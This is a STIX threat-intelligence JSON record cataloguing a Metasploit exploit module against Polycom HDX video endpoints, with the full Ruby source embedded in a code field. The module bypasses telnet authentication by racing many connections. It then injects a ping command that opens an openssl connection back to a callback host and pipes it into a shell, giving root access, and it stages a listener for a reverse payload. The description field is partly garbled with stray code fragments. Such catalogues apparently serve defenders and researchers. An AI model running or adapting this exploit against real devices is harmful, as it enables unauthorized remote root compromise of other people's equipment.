{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0d2f6c4-f727-4c03-92ce-a9b923077f4a",
    "created": "2024-08-14T17:14:16.793512Z",
    "modified": "2024-08-14T17:14:16.793517Z",
    "name": "Polycom Command Shell Authorization Bypass",
    "description": "( The login component of the Polycom Command Shell on Polycom HDX video endpoints, running software versions 3.0.5 and earlier is vulnerable to an authorization bypass when simultaneous connections are made to the service, allowing remote network attackers to gain access to a sandboxed telnet prompt without authentication. Versions prior to 3.0.4 contain OS command injection in the ping command which can be used to execute arbitrary commands as root. ) 'License'         => MSF_LICENSE 'References'      => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/misc/polycom_hdx_auth_bypass.rb",
            "external_id": "polycom_hdx_auth_bypass.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.tempest.com.br/joao-paulo-campello/polycom-web-management-interface-os-command-injection.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'            => 'Polycom Command Shell Authorization Bypass',\n        'Alias'           => 'polycom_hdx_auth_bypass',\n        'Author'          =>\n          [\n            'Paul Haas <Paul [dot] Haas [at] Security-Assessment.com>', # module\n            'h00die <mike@shorebreaksecurity.com>',         # submission/cleanup\n          ],\n        'DisclosureDate'  => '2013-01-18',\n        'Description'     => %q(\n          The login component of the Polycom Command Shell on Polycom HDX\n          video endpoints, running software versions 3.0.5 and earlier,\n          is vulnerable to an authorization bypass when simultaneous\n          connections are made to the service, allowing remote network\n          attackers to gain access to a sandboxed telnet prompt without\n          authentication. Versions prior to 3.0.4 contain OS command\n          injection in the ping command which can be used to execute\n          arbitrary commands as root.\n          ),\n        'License'         => MSF_LICENSE,\n        'References'      =>\n          [\n            [ 'URL', 'http://www.security-assessment.com/files/documents/advisory/Polycom%20HDX%20Telnet%20Authorization%20Bypass%20-%20RELEASE.pdf' ],\n            [ 'URL', 'http://blog.tempest.com.br/joao-paulo-campello/polycom-web-management-interface-os-command-injection.html' ],\n            [ 'EDB', '24494']\n          ],\n        'Platform'    => 'unix',\n        'Arch'        => ARCH_CMD,\n        'Privileged'  => true,\n        'Targets'     => [ [ \"Universal\", {} ] ],\n        'Payload'     =>\n        {\n          'Space'        => 8000,\n          'DisableNops'  => true,\n          'Compat'       => { 'PayloadType' => 'cmd' }\n        },\n        'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_openssl' },\n        'DefaultTarget'  => 0\n      )\n    )\n\n    register_options(\n      [\n        Opt::RHOST(),\n        Opt::RPORT(23),\n        OptAddress.new('CBHOST', [ false, \"The listener address used for staging the final payload\" ]),\n        OptPort.new('CBPORT', [ false, \"The listener port used for staging the final payload\" ])\n      ], self.class\n    )\n    register_advanced_options(\n      [\n        OptInt.new('THREADS', [false, 'Threads for authentication bypass', 6]),\n        OptInt.new('MAX_CONNECTIONS', [false, 'Threads for authentication bypass', 100])\n      ], self.class\n    )\n  end\n\n  def check\n    connect\n    sock.put(Rex::Text.rand_text_alpha(rand(5) + 1) + \"\\n\")\n    Rex.sleep(1)\n    res = sock.get_once\n    disconnect\n\n    if !res && !res.empty?\n      return Exploit::CheckCode::Safe\n    end\n\n    if res =~ /Welcome to ViewStation/\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # Keep track of results (successful connections)\n    results = []\n\n    # Random string for password\n    password = Rex::Text.rand_text_alpha(rand(5) + 1)\n\n    # Threaded login checker\n    max_threads = datastore['THREADS']\n    cur_threads = []\n\n    # Try up to 100 times just to be sure\n    queue = [*(1..datastore['MAX_CONNECTIONS'])]\n\n    print_status(\"Starting Authentication bypass with #{datastore['THREADS']} threads with #{datastore['MAX_CONNECTIONS']} max connections \")\n    until queue.empty?\n      while cur_threads.length < max_threads\n\n        # We can stop if we get a valid login\n        break unless results.empty?\n\n        # keep track of how many attempts we've made\n        item = queue.shift\n\n        # We can stop if we reach max tries\n        break unless item\n\n        t = Thread.new(item) do |count|\n          sock = connect\n          sock.put(password + \"\\n\")\n          res = sock.get_once\n\n          until res.empty?\n            break unless results.empty?\n\n            # Post-login Polycom banner means success\n            if res =~ /Polycom/\n              results << sock\n              break\n            # bind error indicates bypass is working\n            elsif res =~ /bind/\n              sock.put(password + \"\\n\")\n            # Login error means we need to disconnect\n            elsif res =~ /failed/\n              break\n            # To many connections means we need to disconnect\n            elsif res =~ /Error/\n              break\n            end\n            res = sock.get_once\n          end\n        end\n\n        cur_threads << t\n      end\n\n      # We can stop if we get a valid login\n      break unless results.empty?\n\n      # Add to a list of dead threads if we're finished\n      cur_threads.each_index do |ti|\n        t = cur_threads[ti]\n        unless t.alive?\n          cur_threads[ti] = nil\n        end\n      end\n\n      # Remove any dead threads from the set\n      cur_threads.delete(nil)\n\n      Rex.sleep(0.25)\n    end\n\n    # Clean up any remaining threads\n    cur_threads.each { |sock| sock.kill }\n\n    if !results.empty?\n      print_good(\"#{rhost}:#{rport} Successfully exploited the authentication bypass flaw\")\n      do_payload(results[0])\n    else\n      print_error(\"#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable\")\n    end\n  end\n\n  def do_payload(sock)\n    # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise\n    cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])\n\n    # Start a listener\n    start_listener(true)\n\n    # Figure out the port we picked\n    cbport = self.service.getsockname[2]\n\n    # Utilize ping OS injection to push cmd payload using stager optimized for limited buffer < 128\n    cmd = \"\\nping ;s=$IFS;openssl${s}s_client$s-quiet$s-host${s}#{cbhost}$s-port${s}#{cbport}|sh;ping$s-c${s}1${s}0\\n\"\n    sock.put(cmd)\n\n    # Give time for our command to be queued and executed\n    1.upto(5) do\n      Rex.sleep(1)\n      break if session_created?\n    end\n  end\n\n  def stage_final_payload(cli)\n    print_good(\"Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...\")\n    cli.put(payload.encoded + \"\\n\")\n  end\n\n  def start_listener(ssl = false)\n    comm = datastore['ListenerComm']\n    if comm == 'local'\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    self.service = Rex::Socket::TcpServer.create(\n      'LocalPort' => datastore['CBPORT'],\n      'SSL'       => ssl,\n      'SSLCert'   => datastore['SSLCert'],\n      'Comm'      => comm,\n      'Context'   =>\n      {\n        'Msf'        => framework,\n        'MsfExploit' => self\n      }\n    )\n\n    self.service.on_client_connect_proc = proc { |client|\n      stage_final_payload(client)\n    }\n\n    # Start the listening service\n    self.service.start\n  end\n\n  # Shut down any running services\n  def cleanup\n    super\n    if self.service\n      print_status(\"Shutting down payload stager listener...\")\n      begin\n        self.service.deref if self.service.is_a?(Rex::Service)\n        if self.service.is_a?(Rex::Socket)\n          self.service.close\n          self.service.stop\n        end\n        self.service = nil\n      rescue ::Exception\n      end\n    end\n  end\n\n  # Accessor for our TCP payload stager\n  attr_accessor :service\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-01-18",
    "x_mitre_platforms": [
        "unix'"
    ]
}